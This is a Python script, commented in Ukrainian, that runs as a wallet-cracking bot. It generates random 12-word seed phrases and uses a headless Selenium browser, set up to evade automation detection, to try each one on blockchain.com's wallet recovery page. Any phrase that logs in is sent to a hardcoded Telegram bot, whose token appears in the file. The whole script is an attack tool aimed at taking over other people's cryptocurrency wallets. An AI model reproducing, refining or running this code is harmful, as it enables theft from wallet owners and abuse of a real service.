import time
import threading
import requests
import os
from mnemonic import Mnemonic
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, WebDriverException

# --- КОНФІГУРАЦІЯ ---
TELEGRAM_TOKEN = '8748512119:AAFkUhAHfzNi4LgbFNoXyMI5erQpflL1Pnk'
CHAT_ID = '1616301228'
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
FILE_PATH = os.path.join(BASE_DIR, "seeds.txt")
BATCH_SIZE = 1000  # Кількість фраз у партії

# Синхронізаційні прапорці
generation_complete = threading.Event()
checking_complete = threading.Event()
stop_event = threading.Event()

def send_telegram_msg(message):
    try:
        requests.post(
            f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
            data={"chat_id": CHAT_ID, "text": message},
            timeout=10
        )
    except Exception as e:
        print(f"Telegram error: {e}")

def clear_seeds_file():
    """Очищує файл seeds.txt"""
    try:
        with open(FILE_PATH, "w", encoding="utf-8") as f:
            f.write("")
        print("🗑️ Файл seeds.txt очищено")
    except Exception as e:
        print(f"Помилка очищення файлу: {e}")

def generate_seeds_batch(count):
    """Генерує партію сід-фраз"""
    mnemo = Mnemonic("english")
    
    # Очищаємо файл перед новою генерацією
    clear_seeds_file()
    
    print(f"\n🚀 Починаю генерацію {count} фраз...")
    
    with open(FILE_PATH, "a", encoding="utf-8") as f:
        for i in range(count):
            if stop_event.is_set():
                break
            words = mnemo.generate(strength=128)
            f.write(words + "\n")
            if (i + 1) % 100 == 0:
                print(f"  Прогрес: [{i+1}/{count}]")
    
    print(f"✅ Генерацію завершено: {count} фраз")
    generation_complete.set()

def get_driver():
    """Створює драйвер Chrome"""
    options = Options()
    options.add_argument("--headless")  # Безголовий режим для сервера
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")
    options.add_argument("--disable-gpu")
    options.add_argument("--window-size=1920,1080")
    options.add_argument("--disable-blink-features=AutomationControlled")
    options.add_argument("user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.0")
    
    try:
        driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=options)
        return driver
    except Exception as e:
        print(f"Помилка створення драйвера: {e}")
        raise

def check_single_seed(driver, seed, index, total):
    """Перевіряє одну сід-фразу"""
    try:
        print(f"[{index+1}/{total}] Перевірка: {seed[:15]}...")
        
        driver.get("https://login.blockchain.com/#/recover")
        
        # Очікуємо поле вводу
        wait = WebDriverWait(driver, 20)
        input_field = wait.until(EC.presence_of_element_located((By.TAG_NAME, "input")))
        input_field.clear()
        input_field.send_keys(seed)
        
        # Натискаємо кнопку
        button = wait.until(EC.element_to_be_clickable((By.TAG_NAME, "button")))
        button.click()
        
        # Чекаємо відповіді сервера
        time.sleep(15)
        
        # Перевірка URL
        current_url = driver.current_url
        
        if "login" not in current_url and "recover" not in current_url:
            success_msg = f"✅ УСПІХ! Знайдено фразу: {seed}"
            send_telegram_msg(success_msg)
            print(f"\n{'='*50}")
            print(f"!!! ЗНАЙДЕНО: {seed} !!!")
            print(f"{'='*50}\n")
            return True
        else:
            print(f"  ❌ Невдала спроба")
            return False
            
    except TimeoutException:
        print(f"  ⏱️ Таймаут при перевірці")
        return False
    except Exception as e:
        print(f"  ⚠️ Помилка: {e}")
        return False

def check_seeds_batch():
    """Перевіряє всі фрази з файлу"""
    # Чекаємо завершення генерації
    print("\n⏳ Очікуємо завершення генерації...")
    generation_complete.wait()
    
    if stop_event.is_set():
        return
    
    print("🔍 Починаю перевірку фраз...")
    
    if not os.path.exists(FILE_PATH):
        print("❌ Файл seeds.txt не знайдено!")
        checking_complete.set()
        return
    
    with open(FILE_PATH, "r", encoding="utf-8") as file:
        seeds = [line.strip() for line in file if line.strip()]
    
    if not seeds:
        print("❌ Файл seeds.txt порожній!")
        checking_complete.set()
        return
    
    print(f"📋 Завантажено {len(seeds)} фраз для перевірки")
    
    driver = None
    restart_count = 0
    
    try:
        driver = get_driver()
        
        for i, seed in enumerate(seeds):
            if stop_event.is_set():
                break
            
            # Перевірка з рестартом драйвера при помилках
            max_retries = 3
            success = False
            
            for attempt in range(max_retries):
                try:
                    if driver is None:
                        driver = get_driver()
                    
                    result = check_single_seed(driver, seed, i, len(seeds))
                    
                    if result:
                        # Знайдено! Зупиняємо все
                        stop_event.set()
                        checking_complete.set()
                        return
                    
                    success = True
                    break
                    
                except WebDriverException as e:
                    print(f"  🔄 Перезапуск драйвера (спроба {attempt+1})...")
                    if driver:
                        try:
                            driver.quit()
                        except:
                            pass
                    driver = None
                    time.sleep(5)
            
            if not success:
                print(f"  ❌ Пропускаємо фразу {i+1} після {max_retries} спроб")
            
            # Невелика пауза між запитами
            time.sleep(2)
        
        print("\n✅ Всі фрази перевірено")
        send_telegram_msg(f"📊 Перевірено {len(seeds)} фраз. Результатів немає.")
        
    except Exception as e:
        print(f"❌ Критична помилка парсера: {e}")
        send_telegram_msg(f"⚠️ Помилка парсера: {e}")
    
    finally:
        if driver:
            try:
                driver.quit()
            except:
                pass
        checking_complete.set()

def main_loop():
    """Головний цикл роботи"""
    print("="*60)
    print("🤖 ЗАПУСК СИНХРОНІЗОВАНОГО БОТА")
    print(f"📦 Розмір партії: {BATCH_SIZE} фраз")
    print("="*60)
    
    cycle = 1
    
    while not stop_event.is_set():
        print(f"\n{'='*60}")
        print(f"🔄 ЦИКЛ #{cycle}")
        print(f"{'='*60}")
        
        # Скидаємо прапорці
        generation_complete.clear()
        checking_complete.clear()
        
        # Запускаємо генератор в окремому потоці
        generator_thread = threading.Thread(
            target=generate_seeds_batch, 
            args=(BATCH_SIZE,)
        )
        generator_thread.start()
        
        # Запускаємо парсер в основному потоці або паралельно
        # Варіант 1: Послідовно (парсер чекає генерацію)
        check_seeds_batch()
        
        # Альтернативно - паралельний запуск (розкоментуйте, якщо потрібно):
        # checker_thread = threading.Thread(target=check_seeds_batch)
        # checker_thread.start()
        # checker_thread.join()
        
        # Чекаємо завершення генератора (на всяк випадок)
        generator_thread.join()
        
        if stop_event.is_set():
            print("\n🛑 Отримано сигнал зупинки")
            break
        
        print(f"\n⏳ Пауза перед наступним циклом...")
        time.sleep(10)
        
        cycle += 1

if __name__ == "__main__":
    try:
        main_loop()
    except KeyboardInterrupt:
        print("\n🛑 Роботу перервано користувачем")
        stop_event.set()
    except Exception as e:
        print(f"\n💥 Критична помилка: {e}")
        send_telegram_msg(f"🚨 Бот зупинено через помилку: {e}")
    finally:
        print("👋 Бот завершив роботу")
